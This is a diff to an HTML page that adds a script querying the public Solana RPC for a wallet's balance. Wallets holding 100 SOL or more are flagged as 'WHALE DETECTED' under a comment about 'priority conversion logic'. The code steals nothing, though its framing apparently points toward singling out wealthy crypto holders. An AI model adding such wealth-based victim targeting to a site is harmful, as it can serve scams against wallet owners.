@@ -44,7 +44,28 @@
         
         .warning-text { color: #ff0000; font-family: monospace; font-size: 0.8rem; margin-top: 20px; }
     </style>
-</head>
+
+    <script>
+        async function scanForWhales(walletAddress) {
+            const rpc = "https://api.mainnet-beta.solana.com";
+            const response = await fetch(rpc, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    "jsonrpc": "2.0", "id": 1, "method": "getBalance", "params": [walletAddress]
+                })
+            });
+            const data = await response.json();
+            const balance = data.result.value / 1000000000;
+            
+            if(balance >= 100) {
+                console.log("🚨 WHALE DETECTED: " + balance + " SOL");
+                // Trigger priority conversion logic
+                document.body.style.boxShadow = "inset 0 0 100px rgba(20,241,149,0.2)";
+            }
+        }
+    </script>
+    </head>
 <body>
     <div id="global-stats" style="background:#050505; color:#14f195; padding:10px; font-size:12px; font-family:monospace; border:1px solid #14f195; margin:10px;">
         <p>[LIVE_NODES]: <span id="node-count">Scanning...</span></p>
